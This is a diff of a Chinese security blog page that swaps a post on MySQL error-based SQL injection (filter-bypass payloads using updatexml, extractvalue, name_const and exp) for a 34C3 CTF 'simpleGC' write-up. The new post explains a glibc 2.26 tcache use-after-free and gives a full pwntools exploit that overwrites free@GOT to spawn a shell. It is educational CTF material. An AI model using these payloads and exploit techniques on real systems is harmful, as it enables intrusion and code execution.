@@ -3,19 +3,19 @@
 <head>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
-  <title>MySQLi-Error Injection | Hc1m1</title>
+  <title>34c3 ctf simpleGC writeup | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本篇文章源于一道三个白帽的题目">
-<meta name="keywords" content="SQLi">
+  <meta name="description" content="一道glibc 2.26堆利用的题目">
+<meta name="keywords" content="bin">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MySQLi-Error Injection">
-<meta property="og:url" content="http://0x48.pw/2016/04/08/0x18/index.html">
+<meta property="og:title" content="34c3 ctf simpleGC writeup">
+<meta property="og:url" content="http://0x48.pw/2018/01/17/0x40/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description" content="本篇文章源于一道三个白帽的题目">
-<meta property="og:updated_time" content="2017-08-08T10:03:00.000Z">
+<meta property="og:description" content="一道glibc 2.26堆利用的题目">
+<meta property="og:updated_time" content="2018-01-17T19:54:48.217Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MySQLi-Error Injection">
-<meta name="twitter:description" content="本篇文章源于一道三个白帽的题目">
+<meta name="twitter:title" content="34c3 ctf simpleGC writeup">
+<meta name="twitter:description" content="一道glibc 2.26堆利用的题目">
   
     <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -267,11 +267,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-0x18" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0x40" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/04/08/0x18/" class="article-date">
-      <time datetime="2016-04-08T09:52:02.000Z" itemprop="datePublished">2016-04-08</time>
+      <a href="/2018/01/17/0x40/" class="article-date">
+      <time datetime="2018-01-17T09:48:48.000Z" itemprop="datePublished">2018-01-17</time>
 </a>
     </div>
   
@@ -284,7 +284,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      MySQLi-Error Injection
+      34c3 ctf simpleGC writeup
     </h1>
   
 
@@ -295,7 +295,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -305,27 +305,115 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>本篇文章源于一道三个白帽的题目</p>
+        <p>一道glibc 2.26堆利用的题目</p>
 <a id="more"></a>
-<p>该题源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &apos;config.php&apos;;</div><div class="line">foreach(array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $key)&#123;</div><div class="line">    foreach($$key as $k =&gt; $v)&#123;</div><div class="line">        if(is_array($v))&#123;</div><div class="line">            errorBox(&quot;hello,sangebaimao!&quot;);</div><div class="line">        &#125;else&#123;</div><div class="line">            $k[0] !=&apos;_&apos;?$$k = addslashes($v):$$k = &quot;&quot;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function filter($str)&#123;</div><div class="line">    $rstr = &quot;&quot;;</div><div class="line">    for($i=0;$i&lt;strlen($str);$i++)&#123;</div><div class="line">        if(ord($str[$i])&gt;31 &amp;&amp; ord($str[$i])&lt;127)&#123;</div><div class="line">            $rstr = $rstr.$str[$i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $rstr = str_replace(&apos;\&apos;&apos;,&apos;&apos;,$rstr);</div><div class="line">    return $rstr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">if(!empty($message))&#123;</div><div class="line">    if(preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message))&#123;</div><div class="line">        die(&quot;hello,sangebaimao!&quot;);</div><div class="line">    &#125;</div><div class="line">    if(filter($message) !== $message)&#123;</div><div class="line">        die(&quot;hello,sangebaimao!&quot;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sql=&quot;insert guestbook(`message`) value(&apos;$message&apos;);&quot;;</div><div class="line">    mysql_query($sql);</div><div class="line">    $sql = &quot;select * from guestbook order by id limit 0,5;&quot;;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    if($result)&#123;</div><div class="line">        while($row = mysql_fetch_array($result))&#123;</div><div class="line">            $id = $row[&apos;id&apos;];</div><div class="line">            $message = $row[&apos;message&apos;];</div><div class="line">            echo &quot;|$id|=&gt;|$message|&lt;br/&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $message = stripcslashes($message);</div><div class="line">    $sql = &quot;delete from guestbook where id=$id or message =&apos;$message&apos;;&quot;;</div><div class="line">    if(!mysql_query($sql))&#123;</div><div class="line">        print(mysql_error());</div><div class="line">        $sql = &quot;delete from guestbook where id=$id&quot;;</div><div class="line">        mysql_query($sql);</div><div class="line">    &#125;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>这题读完一遍源码之后，就知道需要bypass单引号和<code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code>， 然后是二次注入+报错注入.</p>
-<p>bypass单引号是借助<code>stripcslashes($message);</code>该函数，所以使用<code>?message=aaa\x27</code> 来bypass单引号，这不是本篇重点，就不多说了。</p>
-<p>然后使用<code>/*!00000select*/</code> 来bypass <code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code></p>
-<p><code>/*!*/</code> 只在mysql中有用，在别的数据库中这只是注释，但是在mysql，<code>/*!select 1*/</code>可以成功执行，在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释<br>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-----------+</div><div class="line">| version() |</div><div class="line">+-----------+</div><div class="line">| 5.7.9-log |</div><div class="line">+-----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select /*!50709version()*/;</div><div class="line">+-----------+</div><div class="line">| version() |</div><div class="line">+-----------+</div><div class="line">| 5.7.9-log |</div><div class="line">+-----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select /*!50710version()*/;</div><div class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
-<p>好了，现在可以进行注入了，因为有一句<code>print(mysql_error());</code>，所以可以报错注入了：<br><del>报错注入是从写bug中发现的么？</del></p>
-<h2 id="使用updatexml"><a href="#使用updatexml" class="headerlink" title="使用updatexml"></a>使用updatexml</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</div></pre></td></tr></table></figure></p>
-<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code><br>updatexml函数有三个参数，作用是xml替换，把<code>xml_target</code>中被<code>xpath_expr</code>匹配到的部分使用<code>new_xml</code>替换</p>
-<p>这个报错注入的原理是利用updatexml的参数错误，首先不能有语法错误，要不然注入的语句根本无法执行，语法正确后，先去执行<code>concat(0x27,(/*!00000select version()*/))</code>,得到<code>&#39;5.5.42-log</code>,作为第二个参数传入updatexml函数中，而updatexml第二个参数为xml的匹配表达式，单引号为非法字符，因此报错，输出错误内容<code>&#39;5.5.42-log</code>, 因此得到了你想要得到的数据</p>
-<h2 id="使用ExtractValue"><a href="#使用ExtractValue" class="headerlink" title="使用ExtractValue()"></a>使用ExtractValue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23</div></pre></td></tr></table></figure></p>
-<p>这个同理上面的，不过区别是<br><code>ExtractValue(xml_frag, xpath_expr)</code> 得到<code>xml_frag</code>中被<code>xpath_expr</code>匹配到的值</p>
-<p>不过extractvalue和updatexml有个缺陷是，报错数据最大长度为32</p>
-<h2 id="使用name-const"><a href="#使用name-const" class="headerlink" title="使用name_const"></a>使用name_const</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23</div></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select name_const(&apos;a&apos;,&apos;b&apos;);</div><div class="line">+------+</div><div class="line">| a    |</div><div class="line">+------+</div><div class="line">| b    |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(version(),1); +-----------+-----------+</div><div class="line">| 5.7.9-log | 5.7.9-log |</div><div class="line">+-----------+-----------+</div><div class="line">|         1 |         1 |</div><div class="line">+-----------+-----------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
-<p>本题利用的是表的字段名不允许重复，报错长度没有限制</p>
-<h2 id="利用exp报错"><a href="#利用exp报错" class="headerlink" title="利用exp报错"></a>利用exp报错</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23</div></pre></td></tr></table></figure></p>
-<p>利用double型溢出，可参考<a href="http://drops.wooyun.org/tips/8166" target="_blank" rel="external">http://drops.wooyun.org/tips/8166</a></p>
-<h2 id="利用floor报错"><a href="#利用floor报错" class="headerlink" title="利用floor报错"></a>利用floor报错</h2><p>可参考<a href="http://www.jinglingshu.org/?p=4507" target="_blank" rel="external">http://www.jinglingshu.org/?p=4507</a>, 对于<code>floor</code> 报错注入我理解的不是特别透彻</p>
-<h2 id="利用join报错"><a href="#利用join报错" class="headerlink" title="利用join报错"></a>利用join报错</h2><p><code>join</code> 可用来报列名，同样可参考上面那个链接，本题不是一个很好的join报错案例</p>
+<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC</a></p>
+<h1 id="部署调试环境"><a href="#部署调试环境" class="headerlink" title="部署调试环境"></a>部署调试环境</h1><p>本题的libc给的是2.26版本的，测试系统用的是ubuntu16.04，libc版本为2.24，得知2.24-2.26在堆管理这块更新了一些机制，所以不能用本地的libc进行测试</p>
+<p>这个可以使用：</p>
+<ol>
+<li>LD_PRELOAD=./libc-2.26.so   来指定libc库</li>
+<li>自己编译一份2.26的libc</li>
+</ol>
+<p>因为目前没发现有使用glibc 2.26的linux系统，所以只有上面两种方法</p>
+<h1 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h1><h2 id="sub-40131B函数"><a href="#sub-40131B函数" class="headerlink" title="sub_40131B函数"></a>sub_40131B函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">edit_group()</div><div class="line">&#123;</div><div class="line">  int v1;</div><div class="line">  group_heap *v2;</div><div class="line">  char nptr;</div><div class="line">  char v4;</div><div class="line">  unsigned __int64 v5;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( database[v1] )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Would you like to propagate the change, this will update the group of all the users sharing this group(y/n): &quot;);</div><div class="line">    read_len((__int64)&amp;nptr, 2uLL);</div><div class="line">    printf(&quot;Enter new group name: &quot;);</div><div class="line">    if ( nptr == &apos;y&apos; )</div><div class="line">    &#123;</div><div class="line">      read_len(database[v1]-&gt;group, 0x18uLL);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      read_len((__int64)&amp;v4, 0x18uLL);</div><div class="line">      v2 = add_group_number(&amp;v4);</div><div class="line">      if ( v2 )</div><div class="line">        database[v1]-&gt;group = v2-&gt;group;</div><div class="line">      else</div><div class="line">        database[v1]-&gt;group = _store_group((__int64)&amp;v4)-&gt;group;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在这个函数中有两个漏洞，一个输入的v1未经检查，可以造成数组越界的问题</p>
+<p>另外一个就是当输入<code>n</code>的时候，会重新增加一个group，然后把当前user的group指向新的group，而当前group的计数位不会减1，这就会导致一个情况，可以让一个group的计数位增加到0x100</p>
+<p>再看另一个线程执行的函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">start_routine()</div><div class="line">&#123;</div><div class="line">  unsigned int i;</div><div class="line"></div><div class="line">  sleep(1u);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    for ( i = 0; i &lt;= 0x5F; ++i )</div><div class="line">    &#123;</div><div class="line">      if ( group_database[i] )</div><div class="line">      &#123;</div><div class="line">        if ( !LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        &#123;</div><div class="line">          free((void *)group_database[i]-&gt;group);</div><div class="line">          free(group_database[i]);</div><div class="line">          group_database[i] = 0LL;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    sleep(0);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个函数是本题的关键函数，属于自己使用代码实现的垃圾回收机制，当group的计数位为0的时候，则表示该group没有user使用，所以进行两个free操作，因为取的是计数位的一个字节，所以如果计数位为0x100，则判断为0，进行free操作，这样将会造成uaf漏洞，释放后的堆还能被使用。</p>
+<p>但是这个漏洞的利用太麻烦了，下面，还有一个更容易利用的漏洞</p>
+<h2 id="sub-4011c4函数"><a href="#sub-4011c4函数" class="headerlink" title="sub_4011c4函数"></a>sub_4011c4函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">delete_user()</div><div class="line">&#123;</div><div class="line">  unsigned int v1;</div><div class="line">  char nptr;</div><div class="line">  unsigned __int64 v3;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( v1 &lt;= 0x5F )</div><div class="line">  &#123;</div><div class="line">    if ( database[v1] )</div><div class="line">    &#123;</div><div class="line">      sub_401139((const char *)database[v1]-&gt;group);</div><div class="line">      free(database[v1]);</div><div class="line">      database[v1] = 0LL;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;invalid index&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在该函数中调用了<code>sub_401139</code>函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">sub_401139(const char *a1)</div><div class="line">&#123;</div><div class="line">  unsigned __int16 i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 0x5Fu; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( group_database[i] &amp;&amp; !strcmp(a1, (const char *)group_database[i]-&gt;group) )</div><div class="line">    &#123;</div><div class="line">      if ( LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        --LOBYTE(group_database[i]-&gt;number);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>该函数的目的是，传入被删除的user的group_name，然后到group数据库中去查找是该名字的group，把计数位减1</p>
+<p>正常情况下看这逻辑是没问题的，因为无法创建两个同名的group</p>
+<p>但是在<code>edit_group</code>函数中，如果输入<code>y</code>的情况下，我们能对group_name进行修改，这样就能导致A和B两个group重名，group_name都为<code>test1</code>，这样在删除的情况下，两个group的计数位都会进行自减1，最后导致uaf漏洞</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用上述第二个漏洞进行利用</p>
+<p>首先增加6个不同group</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Group_name</th>
+<th>Age</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a</td>
+<td>b</td>
+<td>0</td>
+</tr>
+<tr>
+<td>a</td>
+<td>bb</td>
+<td>0</td>
+</tr>
+<tr>
+<td>a</td>
+<td>bbb</td>
+<td>0</td>
+</tr>
+<tr>
+<td>a</td>
+<td>bbbb</td>
+<td>0</td>
+</tr>
+<tr>
+<td>a</td>
+<td>bbbbb</td>
+<td>0</td>
+</tr>
+<tr>
+<td>a</td>
+<td>bbbbbb</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p>然后修改第5个group的<code>group_name</code>为<code>bbbbbb</code>和第六个同名</p>
+<p>然后我在delete前5个user</p>
+<p>这样在主线程中，一个free了5个size=0x21的fastbin，将放入tcache中</p>
+<p>然后在子线程中，一个group free了两个size=0x21的fastbin，将放入tcache</p>
+<p>不同线程中，tcache的储存位置不同，tcache的一个size一共能储存最多8个该size的chunk，当tcache满了以后，将会放入fastbin中</p>
+<p>所以在这一波骚操作以后，主线程的tcache中，一个有5个size=0x21的chunk</p>
+<p>而在子线程中，tcache已经被存满了8个size=0x21的chunk</p>
+<p>在第5个user被delete的时候，因为第五个user的group_name已经被修改为和第六个user的group_name重名，所以两个group的计数位皆会自减1，然后在子线程中被free，因为这时候该size的tcache中已被填满，所以被free的chunk将会被放入fastbin中，0x20的fastbin将会有4个</p>
+<p>这个时候第6个user还存在，但是其group却被free，这造成了uaf漏洞，如果我们输出该user的信息，在group字段后面将会输出fastbin单链表中的fd地址信息，可以计算出堆地址(但是对本题没啥用)</p>
+<p>因为第6个user并没有被delete，所以我们仍然能使用<code>edit_group</code>对其的<code>group_name</code>进行修改, 但是因为存储group_name的chunk已经被free，所以我们可以修改该fastbin的fd</p>
+<p>修改到地址: 0x6020E0</p>
+<p>该地址是user的指针数组，我们把该地址-0x10改写到fastbin的fd中去</p>
+<p>然后通过<code>edit_group</code>函数，输入<code>n</code>，进行新建group，首先新建两个group，从tcache中拿出去了4个chunk，因为在主线程中，tcache只有5个chunk，所以再次新建一个group，则会从tcache中拿出最后一个chunk，然后把fastbin中的chunk放入tcache中去，再获取一个chunk</p>
+<p>这个时候tcache中size=0x21的chunk指针指向的是(0x6020E0-0x10)</p>
+<p>所以我们再次新建一个group，用于储存group_name的chunk的返回地址就是<code>0x6020E0</code></p>
+<p>这样我们就能在0x6020E0地址开始任意写入0x18byte的数据</p>
+<table>
+<thead>
+<tr>
+<th>/bin/sh\0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x6020E0</td>
+</tr>
+<tr>
+<td>free_got</td>
+</tr>
+</tbody>
+</table>
+<p>把上述数据写入<code>0x6020E0</code>地址后，user[1]指向的就是地址<code>0x6020E0</code>,看起结构体组成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">database_heap   struc ;</div><div class="line">age             dq ?</div><div class="line">name            dq ?</div><div class="line">group           dq ?</div><div class="line">database_heap   ends</div></pre></td></tr></table></figure>
+<p>首先是age，然后是指向name的地址，然后是指向group的地址，当我们输出user1时，在group字段将会输出free_got地址的值，这样就能计算出libc的基地址，从而算出system的地址</p>
+<p>我们再把free_got的地址改成system的地址</p>
+<p>当我们delete user1时，调用的是free(0x6020E0)，而实际调用的是<code>system(&quot;/bin/sh&quot;)</code>，从而达到getshell的目的</p>
+<p>附上完整payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def addUser(name, group, age):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;0&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, name)</div><div class="line">    r.sendlineafter(&quot;group:&quot;, group)</div><div class="line">    r.sendlineafter(&quot;age:&quot;, str(age))</div><div class="line"></div><div class="line">def displayGroup(groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;1&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def displayUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;2&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.recvuntil(&quot;Group: &quot;)</div><div class="line">    return r.readline().strip()</div><div class="line"></div><div class="line">def editGroup(idx, propogate, groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;3&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.sendlineafter(&quot;(y/n):&quot;, propogate)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def deleteUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;4&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line"></div><div class="line"></div><div class="line">userArr = 0x6020e0</div><div class="line">free_got = 0x602018</div><div class="line"></div><div class="line">r = process([&apos;/opt/libc-2.26/lib/ld-linux-x86-64.so.2&apos;, &apos;--library-path&apos;, &apos;/opt/libc-2.26/lib/&apos;, &apos;./sgc&apos;])</div><div class="line">e = ELF(&quot;/opt/libc-2.26/lib/libc-2.26.so&quot;)</div><div class="line"></div><div class="line">for i in range(9):</div><div class="line">	addUser(&quot;A&quot;, &quot;B&quot;*i, 0)</div><div class="line"></div><div class="line">editGroup(4,&quot;y&quot;,&quot;B&quot;*5)</div><div class="line"># raw_input()</div><div class="line">for i in range(5):</div><div class="line">	deleteUser(i)</div><div class="line"></div><div class="line">sleep(1)</div><div class="line"></div><div class="line">heap_base = u64(displayUser(5).ljust(8, &apos;\0&apos;)) - 0x590</div><div class="line">log.success(&quot;heap_base at: &quot;+hex(heap_base))</div><div class="line"></div><div class="line">editGroup(5,&quot;y&quot;, p64(userArr-0x10))</div><div class="line"># raw_input()</div><div class="line">editGroup(5, &quot;n&quot;, &quot;1-2&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;3-4&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;5-fastbin1&quot;)</div><div class="line"></div><div class="line">payload = &quot;/bin/sh\0&quot;</div><div class="line">payload += p64(userArr)</div><div class="line">payload += p64(free_got)</div><div class="line">editGroup(5, &quot;n&quot;, payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">libc_free = u64(displayUser(1).ljust(8, &apos;\0&apos;))</div><div class="line">libc_base = libc_free - e.symbols[&quot;free&quot;]</div><div class="line">log.success(&quot;libc_base at: &quot;+hex(libc_base))</div><div class="line"></div><div class="line">system_add = libc_base + e.symbols[&quot;system&quot;]</div><div class="line">editGroup(1, &quot;y&quot;, p64(system_add))</div><div class="line">raw_input()</div><div class="line">deleteUser(1)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>该题中tcache的相关细节我没有细说，因为打算写一篇是专门研究tcache机制的博文</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/" target="_blank" rel="external">http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/</a></li>
+<li><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="external">http://tukan.farm/2017/07/08/tcache/</a></li>
+</ol>
 
       
     </div>
@@ -334,13 +422,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/04/08/0x18/">MySQLi-Error Injection</a></p>
+        <p><span>本文标题:</span><a href="/2018/01/17/0x40/">34c3 ctf simpleGC writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
-        <p><span>发布时间:</span>2016-04-08, 17:52:02</p>
-        <p><span>最后更新:</span>2017-08-08, 18:03:00</p>
+        <p><span>发布时间:</span>2018-01-17, 17:48:48</p>
+        <p><span>最后更新:</span>2018-01-18, 03:54:48</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/04/08/0x18/" title="MySQLi-Error Injection">http://0x48.pw/2016/04/08/0x18/</a>
